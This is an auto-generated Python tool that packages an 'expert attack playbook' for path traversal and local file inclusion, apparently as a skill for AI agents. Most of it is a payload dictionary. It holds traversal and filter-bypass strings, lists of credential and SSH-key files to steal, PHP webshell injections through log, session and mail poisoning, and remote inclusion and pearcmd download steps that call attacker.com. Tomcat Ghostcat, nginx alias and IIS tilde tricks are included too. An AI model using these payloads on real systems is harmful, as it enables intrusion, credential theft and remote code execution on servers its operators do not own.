#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/path-traversal-lfi

Skill: SKILL: Path Traversal / Local File Inclusion (LFI) — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-path-traversal-lfi.py --help
      python hack-skills-path-traversal-lfi.py --list
      python hack-skills-path-traversal-lfi.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/path-traversal-lfi'
TITLE = 'SKILL: Path Traversal / Local File Inclusion (LFI) — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: path-traversal-lfi", "description: >-", "Path traversal and LFI playbook. Use when file paths, download endpoints, include operations, archive extraction, or wrapper behavior may expose filesystem control."],
    'skill-path-traversal-local-file-inclusion-lfi-expert-attack-playbook': [],
    '0-related-routing': ["Before deep exploitation, you can first load:", "- [upload insecure files](../upload-insecure-files/SKILL.md) when the primary attack surface is an upload workflow rather than an include or read primitive", "- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the target is a **Java backend** (Spring, Jetty, Undertow, Vert.x) and standard `../`, `%2e%2e`, `%252e` chains are WAF-blocked \u2014 Ghost Bits substitutes `.` with `\u962e` (U+962E) and `/` with `\u962f` (U+962F), re-enabling traversal through Spring CVE-2025-41242 and Jetty `%2>` hex-folding"],
    'first-pass-traversal-chains': ["```text", "../etc/passwd", "../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd", "..\\\\..\\\\..\\\\windows\\\\win.ini"],
    '1-core-concept': ["**Path Traversal**: Read arbitrary files by escaping the intended directory with `../` sequences.", "**LFI**: In PHP, when user input controls `include()`/`require()` \u2014 file is **executed** as PHP code, not just read.", "http://target.com/index.php?page=home", "\u2192 Opens: /var/www/html/pages/home.php", "Traversal attack:", "http://target.com/index.php?page=../../../../etc/passwd", "\u2192 Opens: /etc/passwd"],
    '2-traversal-sequence-variants': ["The filtering strategy determines which encoding to use:"],
    'basic': ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts  (Windows)"],
    'url-encoding': ["%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd     \u2190 %2f = '/'", "%2e%2e%5c%2e%2e%5c%2e%2e%5c                  \u2190 %5c = '\\'"],
    'double-url-encoding-when-server-decodes-once-filter-checks-before-decode': ["%252e%252e%252f%252e%252e%252f  \u2190 %25 = %, double-encoded %2e", "..%252f..%252fetc%252fpasswd"],
    'unicode-overlong-utf-8': ["..%c0%af..%c0%af     \u2190 overlong UTF-8 encoding of '/'", "..%c1%9c..%c1%9c     \u2190 overlong UTF-8 encoding of '\\'", "..%ef%bc%8f          \u2190 fullwidth solidus '\uff0f'"],
    'mixed-encodings': ["..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd   \u2190 double-dot with slash (filter strips single ../)"],
    'filter-strips-so-becomes-after-strip': ["....//          \u2190 becomes ../ after filter strips ../", "..././          \u2190 becomes ../ after filter strips ./"],
    'null-byte-injection-legacy-php-5-3-4': ["../../../../etc/passwd%00.jpg   \u2190 %00 truncates string, strips .jpg extension", "../../../../etc/passwd%00.php"],
    '3-target-files-and-escalation-targets': [],
    'linux': ["/etc/passwd                  \u2190 user list (usernames, UIDs)", "/etc/shadow                  \u2190 password hashes (requires root-level file read)", "/etc/hosts                   \u2190 internal hostnames \u2192 pivot targets", "/etc/hostname                \u2190 server hostname", "/proc/self/environ           \u2190 process environment (DB creds, API keys!)", "/proc/self/cmdline           \u2190 process command line", "/proc/self/fd/0              \u2190 stdin file descriptor", "/proc/[pid]/maps             \u2190 memory maps (loaded libraries with paths)", "/var/log/apache2/access.log  \u2190 for log poisoning", "/var/log/apache2/error.log", "/var/log/nginx/access.log", "/var/log/auth.log            \u2190 SSH attempt log", "/var/mail/www-data            \u2190 email for www-data user", "/home/USER/.ssh/id_rsa       \u2190 SSH private key", "/home/USER/.ssh/authorized_keys", "/home/USER/.bash_history     \u2190 command history (credentials!)", "/home/USER/.aws/credentials  \u2190 AWS keys", "/tmp/sess_SESSIONID          \u2190 PHP session files (if session.save_path=/tmp)"],
    'web-application-config-files': ["/var/www/html/.env           \u2190 Laravel/Node.js env vars", "/var/www/html/config.php     \u2190 PHP config", "/var/www/html/wp-config.php  \u2190 WordPress DB credentials", "/etc/apache2/sites-enabled/  \u2190 Apache vhosts", "/etc/nginx/sites-enabled/    \u2190 Nginx config", "/usr/local/etc/nginx/nginx.conf"],
    'windows': ["C:\\Windows\\System32\\drivers\\etc\\hosts", "C:\\Windows\\win.ini", "C:\\Windows\\System32\\config\\SAM          \u2190 NTLM hashes (often locked)", "C:\\inetpub\\wwwroot\\web.config           \u2190 ASP.NET DB connection strings", "C:\\inetpub\\wwwroot\\global.asa", "C:\\xampp\\htdocs\\wp-config.php", "C:\\Users\\Administrator\\.ssh\\id_rsa", "C:\\ProgramData\\MySQL\\MySQL Server 8\\my.ini  \u2190 MySQL config"],
    '4-php-lfi-rce-techniques': [],
    'log-poisoning-most-reliable-when-log-is-accessible': ["**Step 1**: Inject PHP code into Apache/Nginx access log via User-Agent:", "```http", "GET / HTTP/1.1", "User-Agent: <?php system($_GET['cmd']); ?>", "**Step 2**: Include the log file via LFI:", "?page=../../../../var/log/apache2/access.log&cmd=id"],
    'ssh-log-poisoning': ["Inject PHP payload as SSH username:", "```bash", "ssh '<?php system($_GET[\"cmd\"]); ?>'@target.com", "Then include `/var/log/auth.log`."],
    'php-session-file-poisoning': ["**Step 1**: Send PHP code in session-stored parameter (e.g., username), triggering storage in session file", "**Step 2**: Include session file:", "?page=../../../../tmp/sess_SESSIONID&cmd=id", "Find session ID from cookie `PHPSESSID`."],
    'php-wrappers-for-rce': ["**`php://expect` wrapper** (requires `expect` PHP extension):", "?page=expect://id", "**`php://input` wrapper** (combine LFI with POST body):", "POST ?page=php://input", "Body: <?php system('id'); ?>", "**`data://` wrapper** (inject PHP directly as base64):", "?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id", "(PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= = `<?php system($_GET['cmd']); ?>`)"],
    '5-php-filter-wrapper-file-content-read': ["Use `php://filter` to base64-encode file content to avoid null bytes, binary data:", "?page=php://filter/convert.base64-encode/resource=config.php", "?page=php://filter/convert.base64-encode/resource=/etc/passwd", "?page=php://filter/read=string.rot13/resource=config.php", "?page=php://filter/convert.iconv.UTF-8.UTF-16LE/resource=config.php", "Decode the returned base64 to see the file contents (including PHP source code).", "**Chain filters** (multiple transforms to bypass input filters):", "?page=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd"],
    '6-remote-file-inclusion-rfi-when-enabled': ["If PHP's `allow_url_include = On` (rare but exists):", "?page=http://attacker.com/shell.txt", "?page=ftp://attacker.com/shell.php", "Host a `shell.txt` with `<?php system($_GET['cmd']); ?>`."],
    '7-server-specific-path-truncation': ["PHP has a historical path length limit. Pad with `.` or `/./` to truncate appended extension:", "?page=../../../../etc/passwd/./././././././././././............ (255+ chars)", "When server appends `.php`, the truncation drops it.", "Or null byte if PHP < 5.3.4:", "?page=../../../../etc/passwd%00"],
    '8-parameter-locations-to-test': ["?file=        ?page=        ?include=    ?path=", "?doc=         ?view=        ?load=       ?read=", "?template=    ?lang=        ?url=        ?src=", "?content=     ?site=        ?layout=     ?module=", "Also test: HTTP headers, cookies, form `action` values, import/upload features."],
    '9-filter-bypass-checklist': ["When `../` is stripped or blocked:", "\u25a1 Try URL encoding: %2e%2e%2f", "\u25a1 Try double URL encoding: %252e%252e%252f", "\u25a1 Try overlong UTF-8: ..%c0%af / ..%ef%bc%8f", "\u25a1 Try mixed: ..%2F or ..%5C (backslash on Linux)", "\u25a1 Try redundant sequences: ....// or ..././ (strip once \u2192 still ../)", "\u25a1 Try null byte: /../../../etc/passwd%00", "\u25a1 Try absolute path: /etc/passwd (if no path prefix added)", "\u25a1 Try Windows UNC (Windows server): \\\\127.0.0.1\\C$\\Windows\\win.ini"],
    '10-impact-escalation-path': ["Path traversal (read arbitrary files)", "\u251c\u2500\u2500 Read /etc/passwd \u2192 enumerate users", "\u251c\u2500\u2500 Read /proc/self/environ \u2192 find API keys, DB passwords in env", "\u251c\u2500\u2500 Read app config files \u2192 find credentials \u2192 horizontal movement", "\u251c\u2500\u2500 Read SSH private keys \u2192 direct server login", "\u2514\u2500\u2500 Find log paths \u2192 Log Poisoning \u2192 LFI RCE", "LFI (PHP code inclusion)", "\u251c\u2500\u2500 Log poisoning \u2192 webshell", "\u251c\u2500\u2500 Session file poisoning \u2192 webshell", "\u251c\u2500\u2500 php://input \u2192 direct code execution", "\u251c\u2500\u2500 data:// \u2192 direct code execution", "\u2514\u2500\u2500 php://filter \u2192 read PHP source code \u2192 find more vulnerabilities"],
    '11-lfi-to-rce-escalation-paths': [],
    '12-php-wrapper-exploitation-matrix': [],
    'php-filter-most-powerful-always-try-first': ["```text", "php://filter/convert.base64-encode/resource=index.php", "php://filter/read=string.rot13/resource=index.php", "php://filter/convert.iconv.utf-8.utf-16/resource=index.php", "php://filter/zlib.deflate/resource=index.php", "**Filter chain RCE** (synacktiv php_filter_chain_generator):", "- Chain multiple `convert.iconv` filters to write arbitrary bytes without file upload", "- Tool: `synacktiv/php_filter_chain_generator` \u2192 generates chain that writes PHP code", "- `python3 php_filter_chain_generator.py --chain '<?php system(\"id\");?>'`", "**convert.iconv + dechunk oracle** (blind file read):", "- Tool: `synacktiv/php_filter_chains_oracle_exploit` (filters_chain_oracle_exploit)", "- Enables blind LFI to read file contents character by character"],
    'php-input': ["```text", "POST vulnerable.php?page=php://input", "Body: <?php system('id'); ?>", "Requires `allow_url_include=On`"],
    'data': ["```text", "data://text/plain,<?php system('id');?>", "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==", "data:text/plain,<?php system('id');?>    \u2190 note: no double slash variant also works"],
    'phar': ["```text", "phar://uploaded.phar/test.php", "Triggers deserialization of phar metadata \u2192 RCE via POP chain (requires file upload of crafted phar, can be disguised as JPEG)"],
    'zip': ["```text", "zip://uploaded.zip%23shell.php"],
    'expect': ["```text", "expect://id", "Requires `expect` extension (rare)"],
    '13-pearcmd-lfi-exploitation': ["When `pearcmd.php` is accessible via LFI (common in Docker PHP images):"],
    '14-windows-specific-lfi-techniques': ["**FindFirstFile wildcard** (Windows only):", "- `<` matches any single character, `>` matches any sequence (similar to `?` and `*` but in file APIs)", "- `php<<` can match `php5`, `phtml`, etc.", "- `..\\..\\windows\\win.ini` \u2192 use `<<` for fuzzy matching: `..\\..\\windows\\win<<`"],
    '15-parameter-naming-patterns-high-frequency-targets': ["Based on vulnerability research statistical analysis:", "High-frequency vulnerable endpoints:", "`down.php`, `download.jsp`, `download.asp`, `readfile.php`, `file_download.php`, `getfile.php`, `view.php`"],
    '16-lfi-to-rce-escalation-paths': [],
    '1-proc-self-fd-brute-force': [],
    'when-file-upload-exists-but-path-is-unknown': [],
    'uploaded-files-get-temporary-fd-in-proc-self-fd': [],
    'brute-force-fd-numbers': ["/proc/self/fd/0 through /proc/self/fd/255"],
    'include-the-temp-file-before-it-s-cleaned-up': [],
    '2-proc-self-environ-poisoning': [],
    'if-user-agent-is-reflected-in-process-environment': ["GET /vuln.php?page=/proc/self/environ", "User-Agent: <?php system($_GET['c']); ?>"],
    '3-log-poisoning': [],
    'apache-access-log': ["GET /<?php system($_GET['c']); ?> HTTP/1.1"],
    'then-include-var-log-apache2-access-log': [],
    'ssh-auth-log-username-field': ["ssh '<?php system($_GET[\"c\"]); ?>'@target"],
    'then-include-var-log-auth-log': [],
    'mail-log-smtp-subject': ["MAIL FROM:<attacker@evil.com>", "RCPT TO:<victim@target.com>", "Subject: <?php system($_GET['c']); ?>"],
    'then-include-var-log-mail-log': [],
    '4-php-session-file-poisoning': [],
    'set-session-variable-to-php-code': ["GET /page.php?lang=<?php system($_GET['c']); ?>"],
    'session-file-tmp-sess-phpsessid-or-var-lib-php-sessions-sess-phpsessid': [],
    'include-the-session-file': [],
    '5-phpinfo-assisted-lfi': [],
    'race-condition-upload-via-phpinfo-temp-file': [],
    '1-post-multipart-file-to-phpinfo-page-reveals-tmp-name-tmp-phpxxxxxx': [],
    '2-include-the-temp-file-before-php-cleans-it-up': [],
    'requires-many-concurrent-requests-race-window-10ms': [],
    '6-iconv-cve-2024-2961': [],
    'glibc-iconv-buffer-overflow-in-php-filter-chains': [],
    'tool-cfreal-cnext-exploits': [],
    'converts-lfi-to-rce-without-needing-writable-paths-or-log-poisoning': [],
    '17-php-wrapper-exploitation-matrix': [],
    'php-filter-file-read-without-execution': [],
    'base64-encode-source-code': ["php://filter/convert.base64-encode/resource=index.php"],
    'rot13': ["php://filter/read=string.rot13/resource=index.php"],
    'chain-multiple-filters': ["php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php"],
    'zlib-compression': ["php://filter/zlib.deflate/resource=index.php"],
    'new-filter-chain-rce-synacktiv-php-filter-chain-generator': [],
    'generates-chains-that-write-arbitrary-content-via-iconv-conversions': [],
    'tool-synacktiv-php-filter-chain-generator': ["python3 php_filter_chain_generator.py --chain '<?php system($_GET[\"c\"]); ?>'"],
    'produces-php-filter-convert-iconv-utf8-csiso2022kr-convert-base64-encode-resource-php-temp': [],
    'convert-iconv-dechunk-oracle-blind-file-read': [],
    'error-based-oracle-determine-if-first-byte-of-file-matches-a-character': [],
    'tool-synacktiv-php-filter-chains-oracle-exploit': [],
    'reads-files-byte-by-byte-through-error-behavior-differences': [],
    'data-wrapper': [],
    'execute-arbitrary-php': ["data://text/plain,<?php system('id'); ?>", "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="],
    'bypass-when-data-is-filtered-but-data-without-works': ["data:text/plain,<?php system('id'); ?>"],
    'expect-wrapper': ["expect://id", "expect://ls"],
    'requires-expect-extension-rare-but-check': [],
    'php-input': ["POST /vuln.php?page=php://input", "Content-Type: application/x-www-form-urlencoded", "<?php system('id'); ?>"],
    'zip-and-phar-wrappers': [],
    'zip-upload-zip-containing-php-file': ["zip:///tmp/upload.zip#shell.php"],
    'phar-triggers-deserialization-of-phar-metadata': ["phar:///tmp/upload.phar/anything"],
    'create-malicious-phar-with-crafted-metadata-object': [],
    'can-chain-to-rce-via-pop-gadget-chains-like-php-deserialization': [],
    'phar-can-be-disguised-as-jpg-polyglot-phar-jpg': [],
    'wrapwrap-prefix-suffix-injection': [],
    'tool-ambionics-wrapwrap': [],
    'adds-arbitrary-prefix-and-suffix-to-file-content-via-filter-chains': [],
    'useful-for-converting-file-read-into-xxe-ssrf-or-deserialization-trigger': [],
    '18-pearcmd-lfi-to-rce': ["When PEAR is installed and `register_argc_argv=On` (common in Docker PHP images):"],
    'method-1-config-create-write-arbitrary-content-to-file': ["GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/shell.php"],
    'method-2-man-dir-change-docs-directory-to-write-path': ["GET /index.php?+-c+/tmp/shell.php+-d+man_dir=<?=system($_GET[0])?>+-s+/usr/local/lib/php/pearcmd.php"],
    'method-3-download-fetch-remote-file': ["GET /index.php?+download+http://attacker.com/shell.php&file=/usr/local/lib/php/pearcmd.php"],
    'method-4-install-install-remote-package': ["GET /index.php?+install+http://attacker.com/evil.tgz&file=/usr/local/lib/php/pearcmd.php"],
    'windows-findfirstfile-wildcard': [],
    'windows-and-wildcards-in-file-paths': [],
    'matches-any-extension-matches-single-char': ["include(\"php<<\");      # Matches any .php* file", "include(\"shel>\");      # Matches shell.php if only 1 char follows"],
    'useful-when-exact-filename-is-unknown': [],
    '19-parameter-naming-patterns-high-frequency-endpoints': [],
    'common-vulnerable-parameter-names': ["filename    filepath    path        file        url", "template    page        include     dir         document", "folder      root        pg          lang        doc", "conf        data        content     name        src", "inputFile   hdfile      XFileName   FileUrl     readfile"],
    'high-frequency-vulnerable-endpoints': [],
    'bypass-technique-distribution-from-field-research': [],
    '20-java-spring-path-traversal': [],
    'spring-resource-loading': ["```java", "// Vulnerable patterns \u2014 user input flows into resource path", "ClassPathResource r = new ClassPathResource(userInput);", "getClass().getResourceAsStream(\"/templates/\" + userInput);", "servletContext.getResourceAsStream(\"/WEB-INF/\" + userInput);", "```text"],
    'read-web-inf-deployment-descriptor': ["GET /download?file=../WEB-INF/web.xml", "GET /download?file=../WEB-INF/classes/application.properties", "GET /download?file=../WEB-INF/classes/META-INF/persistence.xml"],
    'spring-boot-specific': ["GET /download?file=../WEB-INF/classes/application.yml", "GET /download?file=../WEB-INF/classes/bootstrap.properties"],
    'high-value-java-targets': ["```text", "/WEB-INF/web.xml                        \u2190 servlet mappings, filter chains, security constraints", "/WEB-INF/classes/application.properties  \u2190 DB creds, API keys, Spring config", "/WEB-INF/classes/application.yml         \u2190 same, YAML format", "/WEB-INF/lib/                            \u2190 application JARs (download for decompilation)", "/META-INF/MANIFEST.MF                    \u2190 build metadata, main class", "/META-INF/context.xml                    \u2190 Tomcat datasource definitions"],
    'spring-mvc-resourcehttprequesthandler': ["When static resources are served via `spring.resources.static-locations`:", "```text", "GET /static/..%252f..%252fWEB-INF/web.xml", "GET /static/..;/..;/WEB-INF/web.xml       \u2190 Tomcat path parameter normalization"],
    '21-tomcat-specific-tricks': [],
    'path-parameter-normalization': ["Tomcat treats `;` as a path parameter delimiter and strips everything from `;` to the next `/` **before** path resolution, but upstream proxies or WAFs may not:", "```text", "GET /app/..;/manager/html           \u2190 Tomcat resolves to /manager/html", "GET /app/..;jsessionid=x/..;/WEB-INF/web.xml", "**WAF bypass chain**: reverse proxy sees `/app/..;/manager/html` as a path under `/app/` (allowed), but Tomcat normalizes `..;` to `..` and traverses up."],
    'ajp-ghostcat-cve-2020-1938': ["Apache JServ Protocol (AJP, port 8009) exposed to the network allows arbitrary file read and JSP execution:", "```text"],
    'read-any-file-through-ajp': ["python3 ajpShooter.py http://target:8009 /WEB-INF/web.xml read"],
    'include-attacker-controlled-file-as-jsp-for-execution': ["python3 ajpShooter.py http://target:8009 / eval --ajp-secret=\"\" \\", "-H \"javax.servlet.include.request_uri:/anything\" \\", "-H \"javax.servlet.include.servlet_path:/uploads/avatar.txt\"", "**Conditions**: AJP connector on port 8009 reachable (default Tomcat, often not firewalled in Docker/internal). `secretRequired` unset prior to Tomcat 9.0.31."],
    'tomcat-double-url-decode': ["```text", "GET /%252e%252e/%252e%252e/etc/passwd"],
    '22-nginx-alias-misconfiguration': [],
    'the-trailing-slash-trap': ["```nginx"],
    'vulnerable-missing-trailing-slash-on-location': ["location /assets {", "alias /data/;", "Nginx maps `/assets../etc/passwd` to `/data/../etc/passwd` to `/etc/passwd` because `alias` replaces the exact location prefix (`/assets`) with the alias path (`/data/`), and `../` in the remainder traverses out.", "```text", "GET /assets../etc/passwd HTTP/1.1", "GET /assets..%2f..%2fetc%2fpasswd HTTP/1.1", "**Correct configuration**:", "```nginx", "location /assets/ {", "alias /data/;"],
    'off-by-one-in-location-alias': ["```nginx", "location /img {", "alias /var/images;"],
    'img-secret-var-images-secret-var-secret': ["Rule: when `alias` is used, the `location` prefix and the alias path must both end with `/`, or neither does."],
    '23-node-js-path-module-quirks': [],
    'path-join-with-url-encoded-input': ["```javascript", "const path = require('path');", "app.get('/files/:name', (req, res) => {", "const filePath = path.join(__dirname, 'uploads', req.params.name);", "res.sendFile(filePath);", "Express URL-decodes `req.params` before `path.join`:", "```text", "GET /files/..%2f..%2f..%2fetc%2fpasswd", "req.params.name = \"../../../etc/passwd\" (already decoded)", "path.join(__dirname, 'uploads', '../../../etc/passwd') = /etc/passwd"],
    'express-static-quirks': ["- Calls `decodeURIComponent` on the path, then `path.normalize()`", "- Double encoding (`%252e%252e%252f`) bypasses if middleware decodes once, then `express.static` decodes again", "- Null bytes (`%00`) rejected in modern Node.js (v14+), but legacy versions may truncate"],
    'url-parse-vs-new-url-confusion': ["```javascript", "// Legacy: url.parse() does NOT resolve path traversal", "const parsed = require('url').parse(userInput);", "// parsed.pathname may contain ../", "// Modern: new URL() normalizes the path", "const parsed = new URL(userInput, 'http://localhost');", "// parsed.pathname has ../ resolved", "Apps mixing `url.parse()` and `path.join()` may allow traversal that `new URL()` would have normalized."],
    '24-iis-short-filename-enumeration-1-tilde-trick': [],
    'concept': ["Windows NTFS generates 8.3 short filenames (e.g., `LONGFI~1.TXT`). IIS responds differently for valid vs invalid short name prefixes."],
    'detection-method': ["```text", "GET /W~1.ASP HTTP/1.1  -> 404 (name pattern valid)", "GET /Z~1.ASP HTTP/1.1  -> 400 (bad request)", "Differential response leaks whether a file starting with that prefix exists."],
    'enumeration-process': ["```text", "Step 1: /A~1* -> 404 = file starting with A exists", "Step 2: /AB~1* -> 404 = file starting with AB exists", "Step 3: /ABCDEF~1.A* -> 404 = extension starts with A"],
    'tools': ["```bash", "java -jar iis_shortname_scanner.jar https://target.com/"],
    'impact': ["- Discover hidden backups, config files, source code", "- Shorter brute-force space: 8.3 format limits character set", "- Works even when directory listing is disabled"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()